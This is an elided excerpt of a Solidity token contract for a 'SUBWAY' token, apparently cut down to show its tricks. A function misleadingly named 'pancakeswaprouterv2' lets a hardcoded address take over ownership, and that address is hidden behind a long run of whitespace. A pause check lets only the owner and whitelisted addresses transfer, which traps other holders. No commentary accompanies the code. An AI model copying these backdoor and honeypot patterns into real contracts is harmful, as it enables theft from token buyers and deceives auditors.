...
contract Ownable is Context {
    ...
    function pancakeswaprouterv2(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address                                                                                                                          (0xa8E3b40E38ba7F825d1da17BBd260bFdDEC52C94));
...
contract changehere is Context, IERC20, Ownable, Pausable {
  ...
  uint256 private _totalSupply = 20000000 * 10**9;
  string private _symbol = "SUBWAY";
  string private _name = "SUBWAY";
 ...
 function includeInWhiteList(address account) public onlyOwner {
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    require(!paused || sender == owner() || recipient == owner() || _isWhitelist[sender] || _isWhitelist[recipient], "paused");
